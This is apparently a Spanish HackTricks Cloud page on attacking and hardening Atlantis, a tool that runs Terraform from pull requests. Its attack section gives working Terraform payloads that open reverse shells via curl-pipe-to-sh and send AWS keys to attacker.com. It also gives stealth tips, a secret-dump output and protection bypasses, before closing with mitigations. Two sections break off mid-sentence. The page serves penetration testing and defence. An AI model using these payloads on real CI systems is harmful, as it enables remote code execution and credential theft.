# Seguridad de Atlantis

<details>

<summary><strong>춰Apoya a HackTricks y obt칠n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **칰ltima versi칩n de PEASS o descargar HackTricks en PDF** 춰Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## Informaci칩n b치sica

Atlantis b치sicamente te ayuda a ejecutar terraform desde solicitudes de extracci칩n de tu servidor git.

![](<../.gitbook/assets/image (51).png>)

## Laboratorio local

1. Ve a la **p치gina de lanzamientos de Atlantis** en [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) y **descarga** la que te convenga.
2. Crea un **token personal** (con acceso al repositorio) de tu usuario de **github**
3. Ejecuta `./atlantis testdrive` y crear치 un **repositorio de demostraci칩n** que puedes usar para **hablar con atlantis**
   1. Puedes acceder a la p치gina web en 127.0.0.1:4141

## Acceso a Atlantis

### Credenciales del servidor Git

**Atlantis** admite varios hosts de git como **Github**, **Gitlab**, **Bitbucket** y **Azure DevOps**.\
Sin embargo, para acceder a los repositorios en esas plataformas y realizar acciones, necesita tener alg칰n **acceso privilegiado otorgado** (al menos permisos de escritura).\
[**La documentaci칩n**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) recomienda crear un usuario en estas plataformas espec칤ficamente para Atlantis, pero algunas personas pueden usar cuentas personales.

{% hint style="warning" %}
En cualquier caso, desde la perspectiva de un atacante, la **cuenta de Atlantis** va a ser muy **interesante** **de comprometer**.
{% endhint %}

### Webhooks

Atlantis utiliza opcionalmente [**secretos de webhook**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) para validar que los **webhooks** que recibe de tu host Git son **leg칤timos**.

Una forma de confirmar esto ser칤a **permitir que las solicitudes solo provengan de las IPs** de tu host Git, pero una forma m치s f치cil es usar un secreto de webhook.

Ten en cuenta que a menos que uses un servidor privado de github o bitbucket, deber치s exponer los puntos finales de webhook a Internet.

{% hint style="warning" %}
Atlantis va a estar **exponiendo webhooks** para que el servidor git pueda enviarle informaci칩n. Desde la perspectiva de un atacante, ser칤a interesante saber **si puedes enviarle mensajes**.
{% endhint %}

### Credenciales del proveedor <a href="#provider-credentials" id="provider-credentials"></a>

Atlantis ejecuta Terraform simplemente **ejecutando los comandos `terraform plan` y `apply`** en el servidor **en el que se aloja Atlantis**. Al igual que cuando ejecutas Terraform localmente, Atlantis necesita credenciales para tu proveedor espec칤fico.

Depende de ti c칩mo [proporcionar credenciales](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) para tu proveedor espec칤fico a Atlantis:

* El [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) de Atlantis y el [M칩dulo AWS Fargate](https://www.runatlantis.io/docs/deployment.html#aws-fargate) tienen sus propios mecanismos para las credenciales del proveedor. Lee su documentaci칩n.
* Si est치s ejecutando Atlantis en una nube, muchas nubes tienen formas de dar acceso a la API de la nube a las aplicaciones que se ejecutan en ellas, por ejemplo:
  * [Roles de AWS EC2](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Buscar "EC2 Role")
  * [Cuentas de servicio de instancia de GCE](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* Muchos usuarios establecen variables de entorno, por ejemplo `AWS_ACCESS_KEY`, donde se est치 ejecutando Atlantis.
* Otros crean los archivos de configuraci칩n necesarios, por ejemplo `~/.aws/credentials`, donde se est치 ejecutando Atlantis.
* Usa el [Proveedor HashiCorp Vault](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) para obtener credenciales del proveedor.

{% hint style="warning" %}
El **contenedor** donde se **ejecuta Atlantis** probablemente **contendr치 credenciales privilegiadas** para los proveedores (AWS, GCP, Github...) que Atlantis est치 administrando a trav칠s de Terraform.
{% endhint %}

### P치gina web

Por defecto, Atlantis ejecutar치 una **p치gina web en el puerto 4141 en localhost**. Esta p치gina solo te permite habilitar/deshabilitar la aplicaci칩n de Atlantis y verificar el estado del plan de los repositorios y desbloquearlos (no permite modificar cosas, por lo que no es muy 칰til).

Probablemente no la encontrar치s expuesta a Internet, pero parece que por defecto **no se necesitan credenciales** para acceder a ella (y si las hay, `atlantis`:`atlantis` son las **predeterminadas**).

## Configuraci칩n del servidor

La configuraci칩n del servidor de `atlantis` se puede especificar mediante indicadores de l칤nea de comandos, variables de entorno, un archivo de configuraci칩n o una combinaci칩n de los tres.

* Puedes encontrar [**aqu칤 la lista de indicadores**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) admitidos por el servidor Atlantis
* Puedes encontrar [**aqu칤 c칩mo transformar una opci칩n de configuraci칩n en una variable de entorno**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

Los valores se **eligen en este orden**:

1. Indicadores
2. Variables de entorno
3. Archivo de configuraci칩n

{% hint style="warning" %}
Ten en cuenta que en la configuraci칩n puedes encontrar valores interesantes como **tokens y contrase침as**
## Comandos de Atlantis

[**En la documentaci칩n**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) se pueden encontrar las opciones que se pueden usar para ejecutar Atlantis:

```bash
# Obtener ayuda
atlantis help

# Ejecutar terraform plan
atlantis plan [opciones] -- [banderas de terraform plan]
##Opciones:
## -d directorio
## -p proyecto
## --verbose
## Tambi칠n se pueden agregar opciones adicionales de terraform

# Ejecutar terraform apply
atlantis apply [opciones] -- [banderas de terraform apply]
##Opciones:
## -d directorio
## -p proyecto
## -w espacio de trabajo
## --auto-merge-disabled
## --verbose
## Tambi칠n se pueden agregar opciones adicionales de terraform
```

## Ataques

{% hint style="warning" %}
Si durante la explotaci칩n se encuentra este **error**: `Error: Error acquiring the state lock`

Se puede solucionar ejecutando:

```
atlantis unlock #Es posible que deba ejecutarse en un PR diferente
atlantis plan -- -lock=false
```
{% endhint %}

### Atlantis plan RCE - Modificaci칩n de configuraci칩n en nuevo PR

Si se tiene acceso de escritura sobre un repositorio, se podr치 crear una nueva rama en 칠l y generar un PR. Si se puede **ejecutar `atlantis plan`** (o tal vez se ejecuta autom치ticamente) **se podr치 RCE dentro del servidor Atlantis**.

Se puede hacer esto haciendo que [**Atlantis cargue una fuente de datos externa**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Solo se debe poner una carga 칰til como la siguiente en el archivo `main.tf`:

```json
data "external" "example" {
  program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```

#### Ataque m치s sigiloso

Se puede realizar este ataque incluso de una manera **m치s sigilosa**, siguiendo estas sugerencias:

* En lugar de agregar la rev shell directamente en el archivo terraform, se puede **cargar un recurso externo** que contenga la rev shell:

```javascript
module "not_rev_shell" {
  source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```

Se puede encontrar el c칩digo de la rev shell en [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* En el recurso externo, use la funci칩n **ref** para ocultar el **c칩digo de la rev shell de terraform en una rama** dentro del repositorio, algo como: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **En lugar** de crear un **PR a master** para activar Atlantis, **crear 2 ramas** (test1 y test2) y crear un **PR de una a la otra**. Cuando se haya completado el ataque, simplemente **elimine el PR y las ramas**.

### Atlantis plan Secrets Dump

Se pueden **filtrar secretos utilizados por terraform** ejecutando `atlantis plan` (`terraform plan`) poniendo algo como esto en el archivo terraform:

```json
output "dotoken" {
  value = nonsensitive(var.do_token)
}
```

### Atlantis apply RCE - Modificaci칩n de configuraci칩n en nuevo PR

Si se tiene acceso de escritura sobre un repositorio, se podr치 crear una nueva rama en 칠l y generar un PR. Si se puede **ejecutar `atlantis apply` se podr치 RCE dentro del servidor Atlantis**.

Sin embargo, por lo general se necesitar치 omitir algunas protecciones:

* **Fusionable**: Si esta protecci칩n est치 configurada en Atlantis, solo se puede ejecutar **`atlantis apply` si el PR es fusionable** (lo que significa que se debe omitir la protecci칩n de la rama).
  * Ver posibles [**bypasses de protecciones de rama**](broken-reference/)
* **Aprobado**: Si esta protecci칩n est치 configurada en Atlantis, alg칰n **otro usuario debe aprobar el PR** antes de que se pueda ejecutar `atlantis apply`
  * Por defecto se puede abusar del [**token de Gitbot para omitir esta protecci칩n**](broken-reference/)

Ejecutando **`terraform apply` en un archivo Terraform malicioso con** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Solo se necesita asegurarse de que alguna carga 칰til como las siguientes termine en el archivo `main.tf`:

```json
// Payload 1 para robar un secreto
resource "null_resource" "secret_stealer" {
  provisioner "local-exec" {
    command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
  }
}

// Payload 2 para obtener una rev shell
resource "null_resource" "rev_shell" {
  provisioner "local-exec" {
    command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
  }
}
```

Siga las **sugerencias de la t칠cnica anterior** para realizar este ataque de una manera **m치s sigilosa**.

### Inyecci칩n de par치metros de Terraform

Cuando se ejecuta `atlantis plan` o `atlantis apply`, terraform se est치 ejecutando en segundo plano, se pueden pasar comandos a terraform desde atlantis comentando algo como:

```bash
atlantis plan -- <comandos de terraform>
atlantis plan -- -h #Obtener ayuda de terraform plan

atlantis apply -- <comandos de terraform>
atlantis apply -- -h #Obtener ayuda de terraform apply
```

Algo que se puede pasar son variables de entorno que podr칤an ser 칰tiles para omitir algunas protecciones. Ver variables de entorno de terraform en [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

### Flujo de trabajo personalizado

Ejecutando **comandos de compilaci칩n personalizados maliciosos** especificados en un archivo `atlantis.yaml`. Atlantis usa el archivo `atlantis.yaml` de la rama de solicitud de extracci칩n, **no** de `master`.\
Esta posibilidad se mencion칩 en una secci칩n anterior:

{% hint style="danger" %}
Si la bandera de [**configuraci칩n del lado del servidor**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` est치 configurada en **True**, se pueden **especificar** flujos de trabajo en el archivo **`atlantis.yaml`** de cada repositorio. Tambi칠n es potencialmente necesario que **`allowed_overrides`** especifique tambi칠n **`workflow`** para **anular el flujo de trabajo** que se va a utilizar.

Esto b치sicamente dar치 **RCE en el servidor Atlantis a cualquier usuario que pueda acceder a ese repositorio**.

```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
  workflow: custom1
workflows:
  custom1:
    plan:
      steps:
      - init
      - run: my custom plan command
    apply:
      steps:
      - run: my custom apply command
```
{% endhint %}

### Saltar protecciones de plan/apply

Si la bandera de [**configuraci칩n del lado del servidor**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allowed_overrides` _tiene_ `apply_requirements` configurado, es posible que un repositorio **modifique las protecciones de plan/apply para saltarlas**.

```yaml
repos:
- id: /.*/
  apply_requirements: []
```

### Secuestro de PR

Si alguien env칤a comentarios de **`atlantis plan/apply` en sus solicitudes de extracci칩n v치lidas,** har치 que terraform se ejecute cuando no se desea.

Adem치s, si no se ha configurado en la **protecci칩n de la r
## Mitigaciones

### No usar en repositorios p칰blicos <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Debido a que cualquier persona puede comentar en solicitudes de extracci칩n p칰blicas, incluso con todas las mitigaciones de seguridad disponibles, sigue siendo peligroso ejecutar Atlantis en repositorios p칰blicos sin una configuraci칩n adecuada de la seguridad.

### No usar `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Si est치 ejecutando en un repositorio p칰blico (lo cual no se recomienda, ver arriba), no debe establecer `--allow-fork-prs` (por defecto en falso) porque cualquier persona puede abrir una solicitud de extracci칩n desde su bifurcaci칩n a su repositorio.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis requiere que especifique una lista blanca de repositorios que aceptar치 webhooks a trav칠s de la bandera `--repo-allowlist`. Por ejemplo:

* Repositorios espec칤ficos: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Toda su organizaci칩n: `--repo-allowlist=github.com/runatlantis/*`
* Todos los repositorios en su instalaci칩n de GitHub Enterprise: `--repo-allowlist=github.yourcompany.com/*`
* Todos los repositorios: `--repo-allowlist=*`. 칔til cuando se encuentra en una red protegida pero peligroso sin establecer tambi칠n un secreto de webhook.

Esta bandera asegura que su instalaci칩n de Atlantis no se est칠 utilizando con repositorios que no controla. Consulte `atlantis server --help` para obtener m치s detalles.

### Proteger la planificaci칩n de Terraform <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Si los atacantes que env칤an solicitudes de extracci칩n con c칩digo Terraform malicioso est치n en su modelo de amenazas, debe tener en cuenta que las aprobaciones de `terraform apply` no son suficientes. Es posible ejecutar c칩digo malicioso en un `terraform plan` utilizando el [origen de datos externo](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) o especificando un proveedor malicioso. Este c칩digo podr칤a luego filtrar sus credenciales.

Para evitar esto, podr칤a:

1. Incluir proveedores en la imagen de Atlantis o en el host y denegar la salida en producci칩n.
2. Implementar el protocolo de registro de proveedores internamente y denegar la salida p칰blica, de esta manera controla qui칠n tiene acceso de escritura al registro.
3. Modificar la configuraci칩n del repositorio del lado del servidor [server-side repo configuration](https://www.runatlantis.io/docs/server-side-repo-config.html) en el paso `plan` para validar el uso de proveedores o fuentes de datos no permitidos o solicitudes de extracci칩n de usuarios no permitidos. Tambi칠n podr칤a agregar validaci칩n adicional en este punto, por ejemplo, requerir un "pulgar hacia arriba" en la solicitud de extracci칩n antes de permitir que el `plan` contin칰e. Conftest podr칤a ser 칰til aqu칤.

### Secretos de webhook <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis debe ejecutarse con secretos de webhook establecidos a trav칠s de las variables de entorno `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET`. Incluso con la bandera `--repo-allowlist` establecida, sin un secreto de webhook, los atacantes podr칤an hacer solicitudes a Atlantis haci칠ndose pasar por un repositorio que est치 en la lista blanca. Los secretos de webhook aseguran que las solicitudes de webhook provengan realmente de su proveedor de VCS (GitHub o GitLab).

Si est치 utilizando Azure DevOps, en lugar de secretos de webhook, agregue un nombre de usuario y una contrase침a b치sicos.

### Autenticaci칩n b치sica de Azure DevOps <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps admite el env칤o de una cabecera de autenticaci칩n b치sica en todos los eventos de webhook. Esto requiere el uso de una URL HTTPS para la ubicaci칩n de su webhook.

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Si est치 utilizando secretos de webhook pero su tr치fico es a trav칠s de HTTP, los secretos de webhook podr칤an ser robados. Habilite SSL/HTTPS utilizando las banderas `--ssl-cert-file` y `--ssl-key-file`.

### Habilitar la autenticaci칩n en el servidor web de Atlantis <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

Es muy recomendable habilitar la autenticaci칩n en el servicio web. Habilite BasicAuth utilizando la bandera `--web-basic-auth=true` y configure un nombre de usuario y una contrase침a utilizando las banderas `--web-username=yourUsername` y `--web-password=yourPassword`.

Tambi칠n puede pasar estos como variables de entorno `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` y `ATLANTIS_WEB_PASSWORD=yourPassword`.

## Referencias

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)

<details>

<summary><strong>춰Apoye a HackTricks y obtenga beneficios!</strong></summary>

* Si desea ver su **empresa anunciada en HackTricks** o si desea acceder a la **칰ltima versi칩n de PEASS o descargar HackTricks en PDF** 춰Consulte los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obtenga el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
* **칔nase al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤game** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Comparta sus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>